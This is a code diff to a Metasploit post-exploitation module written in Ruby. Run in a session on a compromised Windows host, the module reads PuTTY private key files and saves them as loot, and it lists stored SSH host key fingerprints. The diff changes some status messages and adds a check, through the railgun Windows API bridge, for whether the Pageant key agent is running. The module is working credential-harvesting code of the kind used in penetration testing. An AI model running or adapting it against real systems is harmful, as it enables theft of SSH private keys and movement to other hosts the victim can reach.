@@ -148,12 +148,12 @@ class Metasploit3 < Msf::Post
         if file?(filename)
            if ppk = read_file(filename) # Attempt to read the contents of the file
                 stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)
-                print_status("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
+                print_good("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
            else
                 print_error("Unable to read PuTTY private key file for \'#{ses['Name']}\' (#{filename})") # May be that we do not have permissions etc
            end
         else
-           print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be found.")
+           print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be read.")
         end
     end
   end
@@ -182,6 +182,8 @@ class Metasploit3 < Msf::Post
 
     end
 
+    print_line # Just for readability
+
     # Now search for SSH stored keys. These could be useful because it shows hosts that the user
     # has previously connected to and accepted a key from. 
     print_status("Looking for previously stored SSH host key fingerprints")
@@ -201,6 +203,16 @@ class Metasploit3 < Msf::Post
             display_stored_host_keys_report(all_stored_keys) 
         end
     end
+
+    print_line # Just for readability
+
+    print_status("Looking for Pageant...")
+    hwnd = client.railgun.user32.FindWindowW("Pageant", "Pageant")
+    if hwnd['return']
+        print_good("Pageant is running (Handle 0x#{sprintf("%x",hwnd['return'])})")
+    else
+        print_error("Pageant is not running")
+    end 
 
   end
 
